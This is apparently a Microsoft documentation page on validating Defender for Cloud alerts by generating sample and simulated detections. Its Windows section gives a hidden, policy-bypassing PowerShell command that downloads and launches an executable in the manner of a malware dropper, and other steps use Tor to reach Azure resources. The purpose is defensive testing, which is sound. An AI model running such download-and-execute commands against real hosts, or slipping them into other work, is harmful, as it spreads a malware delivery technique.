---
title: Validate alerts in Microsoft Defender for Cloud
description: Learn how to validate security alerts in Microsoft Defender for Cloud to ensure your system is properly configured and can effectively monitor threats.
ms.topic: how-to
ms.custom: linux-related-content, msecd-doc-authoring-1013
#customer intent: As a security admin, I want to validate Microsoft Defender for Cloud alerts so that I can confirm detections and response workflows are working as expected.
ms.date: 07/03/2026
ai-usage: ai-assisted
---

# Validate alerts in Microsoft Defender for Cloud

This article explains how to validate that your system is configured for Microsoft Defender for Cloud alerts so that you can monitor and respond to threats.

## What are security alerts?

Alerts are notifications that Defender for Cloud generates when it detects threats on your resources. Defender for Cloud ranks alerts by severity and lists them with key details. You can use this information to quickly investigate each problem. Defender for Cloud also provides steps to help you remediate an attack.

For more information, see [Security alerts in Defender for Cloud](alerts-overview.md) and [Managing and responding to security alerts](manage-respond-alerts.md).

## Prerequisites

To receive all the alerts, your machines and the connected Log Analytics workspaces need to be in the same tenant.

## Generate sample security alerts

If you use the new preview alerts experience, you can create sample alerts from the security alerts page in the Azure portal. For more details, see [Manage and respond to security alerts in Microsoft Defender for Cloud](manage-respond-alerts.md).

## Create sample alerts

Use sample alerts to:

- Evaluate the value and capabilities of your Microsoft Defender plans.
- Validate any configurations you've made for your security alerts, such as security information and event management (SIEM) integrations, workflow automation, and email notifications.

To create sample alerts:

1. As a user with the role **Subscription Contributor**, from the toolbar on the security alerts page, select **Sample alerts**.
1. Select the subscription.
1. Select the relevant Microsoft Defender plan(s) for which you want to see alerts.
1. Select **Create sample alerts**.

:::image type="content" source="media/alert-validation/create-sample-alerts-procedures.png" alt-text="Screenshot showing steps to create sample alerts in Microsoft Defender for Cloud." lightbox="media/alert-validation/create-sample-alerts-procedures.png":::

A notification appears letting you know that the sample alerts are created:

:::image type="content" source="media/alert-validation/notification-sample-alerts-creation.png" alt-text="Screenshot showing notification that the sample alerts are being generated." lightbox="media/alert-validation/notification-sample-alerts-creation.png":::

After a few minutes, the sample alerts appear on the security alerts page. The sample alerts also appear anywhere else that you've configured to receive your Microsoft Defender for Cloud security alerts (connected SIEMs, email notifications, and so on).

:::image type="content" source="media/alert-validation/sample-alerts.png" alt-text="Screenshot showing sample alerts in the security alerts list." lightbox="media/alert-validation/sample-alerts.png":::

> [!TIP]
> The alerts are for simulated resources.

## Simulate alerts on your Azure virtual machines (VMs) (Windows)

Before you begin, make sure that:

- The Defender for Endpoint agent is installed on your machine through Defender for Servers.
- Microsoft Defender for Endpoint has Real-Time protection turned on. To check this setting, see [Configure real-time protection in Microsoft Defender Antivirus](/microsoft-365/security/defender-endpoint/configure-real-time-protection-microsoft-defender-antivirus).

On the machine you want to test, open an elevated command prompt and run the script:

1. Go to **Start** and type `cmd`.
1. Right-select **Command Prompt** and select **Run as administrator**.

    :::image type="content" source="media/alert-validation/command-prompt.png" alt-text="Screenshot showing where to select Run as Administrator." lightbox="media/alert-validation/command-prompt.png":::

1. At the prompt, copy and run the following command: `powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\test-MDATP-test\invoice.exe');Start-Process 'C:\test-MDATP-test\invoice.exe'`.
1. The Command Prompt window closes automatically. If successful, a new alert should appear in Defender for Cloud Alerts blade in 10 minutes.
1. The message line in the PowerShell box should appear similar to how it's presented here:

    :::image type="content" source="media/alert-validation/powershell-no-exit.png" alt-text="Screenshot showing PowerShell message line." lightbox="media/alert-validation/powershell-no-exit.png":::

Alternatively, you can use the [EICAR](https://www.eicar.org/download-anti-malware-testfile/) test string to simulate the alert on Windows. Create a text file, paste the EICAR line, and save the file as an executable file to your machine's local drive.

## Simulate alerts on your Azure virtual machines (VMs) (Linux)

Before you begin, make sure that:

- The Microsoft Defender for Endpoint agent is installed on your machine as part of Defender for Servers integration.
- Microsoft Defender for Endpoint runs with Real-Time protection enabled. To verify this setting, see [Configure real-time protection in Microsoft Defender Antivirus](/microsoft-365/security/defender-endpoint/configure-real-time-protection-microsoft-defender-antivirus).

On the machine where you want to simulate the attacked resource, follow these steps:

1. Open a Terminal window, copy and run the following command: `curl -O https://secure.eicar.org/eicar.com.txt`
1. The Terminal window closes automatically. If successful, a new alert should appear in the Defender for Cloud Alerts blade within 10 minutes.

## Simulate alerts on Kubernetes

Defender for Containers creates alerts for your clusters and cluster nodes. It watches both the control plane (API server) and the container workload.

To simulate alerts for the Defender for Containers control plane and containerized workload, use the [Kubernetes alerts simulation tool](alerts-containers.md#kubernetes-alerts-simulation-tool).

To learn more, see [Microsoft Defender for Containers](defender-for-containers-introduction.md).

## Simulate alerts for App Service

You can simulate alerts for resources running on [App Service](/azure/app-service/overview).

1. Create a new website and wait 24 hours for it to register with Defender for Cloud, or use an existing website.
1. Once the website is created, access it by using the following URL:
    1. Open the app service resource pane and copy the domain for the URL from the default domain field.

        :::image type="content" source="media/alert-validation/copy-default-domain.png" alt-text="Screenshot showing where to copy the default domain." lightbox="media/alert-validation/copy-default-domain.png":::

    1. Copy the website name into the URL: `https://<website-name>.azurewebsites.net/This_Will_Generate_ASC_Alert`.
1. An alert is generated within about 2 to 4 hours.

<a name="simulate-alerts-for-storage-atp-advanced-threat-protection"></a>
## Simulate alerts for Storage Advanced Threat Protection (ATP)

To validate threat detection for Microsoft Defender for Storage, complete the following steps:

1. Navigate to a storage account that has Azure Defender for Storage enabled.
1. Select the **Containers** tab in the sidebar.

    :::image type="content" source="media/alert-validation/storage-atp-navigate-container.png" alt-text="Screenshot showing where to navigate to select a container." lightbox="media/alert-validation/storage-atp-navigate-container.png":::

1. Navigate to an existing container or create a new one.
1. Upload a file to that container. Avoid uploading any file that might contain sensitive data.

    :::image type="content" source="media/alert-validation/storage-atp-upload-image.png" alt-text="Screenshot showing where to upload a file to the container." lightbox="media/alert-validation/storage-atp-upload-image.png":::

1. Right-select the uploaded file and select **Generate SAS**.
1. Select the Generated SAS token and URL button (no need to change any options).
1. Copy the generated SAS URL.
1. Open the [Tor browser download page](https://www.torproject.org/download/) and install the Tor browser.
1. In the Tor browser, navigate to the SAS URL. You should now see and can download the file that was uploaded.

<a name="test-appservices-alerts"></a>
## Simulate alerts for App Service (EICAR)

**To simulate an app services EICAR alert:**

1. Find the HTTP endpoint of the website either by going into the Azure portal blade for the App Services website or using the custom DNS entry associated with this website. (The default URL endpoint for the Azure App Services website has the suffix `https://XXXXXXX.azurewebsites.net`). The website should be an existing website and not one that was created before the alert simulation.
1. Find the HTTP endpoint of the website by going into the Azure portal blade for the App Services website or using the custom DNS entry associated with this website. (The default URL endpoint for the Azure App Services website has the suffix `https://XXXXXXX.azurewebsites.net`). The website should be an existing website and not one that was created before the alert simulation.
1. Browse to the website URL and add the following fixed suffix: `/This_Will_Generate_ASC_Alert`. The URL should look like this: `https://XXXXXXX.azurewebsites.net/This_Will_Generate_ASC_Alert`. It might take some time for the alert to generate (~1.5 hours).

## Validate Azure Key Vault Threat Detection

To validate Azure Key Vault threat detection, [create a key vault by using the Azure portal](/azure/key-vault/general/quick-create-portal) and then follow these steps:

### Prerequisites

- [Create a key vault by using the Azure portal](/azure/key-vault/general/quick-create-portal).
- [Add a secret to the key vault](/azure/key-vault/secrets/quick-create-portal#add-a-secret-to-key-vault).

### Validation steps

To validate Azure Key Vault threat detection:

1. After creating the Key Vault and the secret, go to a VM that has internet access and [download the TOR Browser](https://www.torproject.org/download/).
1. Install the TOR Browser on your VM.
1. After the installation, open your regular browser, sign in to the Azure portal, and access the Key Vault page. Select the highlighted URL and copy the address.
1. Open TOR and paste this URL (you need to authenticate again to access the Azure portal).
1. After accessing, you can also select the **Secrets** option in the left pane.
1. In the TOR Browser, sign out from the Azure portal and close the browser.
1. After some time, Defender for Key Vault triggers an alert with detailed information about this suspicious activity.

<a name="next-steps"></a>
## Related content

Learn more about alerts and threat detection in Defender for Cloud:

- [Validating Azure Key Vault threat detection in Microsoft Defender for Cloud](https://techcommunity.microsoft.com/t5/microsoft-defender-for-cloud/validating-azure-key-vault-threat-detection-in-microsoft/ba-p/1220336)
- [Managing and responding to security alerts in Microsoft Defender for Cloud](manage-respond-alerts.md) - Learn how to manage alerts and respond to security incidents in Defender for Cloud.
- [Understanding security alerts in Microsoft Defender for Cloud](./alerts-overview.md)


